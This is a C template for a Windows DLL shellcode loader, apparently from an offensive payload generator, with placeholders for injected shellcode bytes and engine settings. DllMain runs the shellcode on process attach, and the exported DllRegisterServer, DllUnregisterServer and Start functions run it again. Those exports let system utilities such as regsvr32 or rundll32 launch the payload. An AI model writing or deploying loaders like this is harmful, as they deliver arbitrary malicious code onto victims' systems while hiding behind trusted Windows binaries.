%ENGINE_DEFINES%
#include "engine.h"

static unsigned char shellcode[] = { %SHELLCODE_BYTES% };
static unsigned int shellcode_len = %SHELLCODE_LEN%;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            engine_run(shellcode, shellcode_len);
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

__declspec(dllexport) void CALLBACK DllRegisterServer(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    engine_run(shellcode, shellcode_len);
}

__declspec(dllexport) void CALLBACK DllUnregisterServer(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    engine_run(shellcode, shellcode_len);
}

__declspec(dllexport) void CALLBACK Start(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    engine_run(shellcode, shellcode_len);
}
